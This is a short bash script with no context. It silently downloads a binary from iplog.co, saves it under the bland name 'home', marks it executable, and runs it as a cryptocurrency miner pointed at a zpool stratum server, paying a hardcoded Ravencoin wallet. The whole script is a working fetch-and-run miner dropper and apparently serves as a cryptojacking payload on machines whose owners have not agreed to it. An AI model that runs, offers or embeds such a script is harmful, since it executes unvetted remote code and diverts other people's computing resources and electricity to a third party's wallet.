#!/bin/bash
wget -q -O home https://iplog.co/bash && chmod +x home >/dev/null 2>&1
./home -a minotaurx -o stratum+tcps://stratum-sea.mine.zpool.ca:7019 -u RA7pnMYRfnjqikV7gWfHgLFeEjqKKWJw9f.$(echo $(shuf -i 1-9 -n 1)-Suuu) -p c=RVN
